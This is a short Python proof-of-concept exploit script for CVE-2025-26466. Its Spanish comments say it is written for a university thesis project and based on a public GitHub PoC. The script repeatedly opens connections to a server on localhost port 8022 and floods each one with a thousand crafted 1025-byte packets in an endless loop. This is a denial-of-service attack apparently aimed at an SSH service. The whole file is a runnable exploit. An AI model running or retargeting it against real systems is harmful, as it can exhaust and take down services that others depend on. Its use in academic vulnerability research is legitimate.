# PoC para la vulnerabilidad CVE-2025-26466 para el TFG IdIoT
# Basado en: https://github.com/jhonnybonny/CVE-2025-26466

import socket
import threading

PING_PAYLOAD = b'\x05' + b'\x00' * 1024

def attack(host, port, packets):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        sock.sendall(b"PoC-CVE-2025-26466\r\n")

        for _ in range(packets):
            try:
                sock.sendall(PING_PAYLOAD)
            except (BrokenPipeError, ConnectionResetError):
                break
        print("Thread finished")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()
            
def main():
    host = 'localhost'
    port = 8022
    packets = 1000
    while True:
        thread = threading.Thread(target=attack, args=(host, port, packets))
        thread.start()
        thread.join()

if __name__ == "__main__":
    main()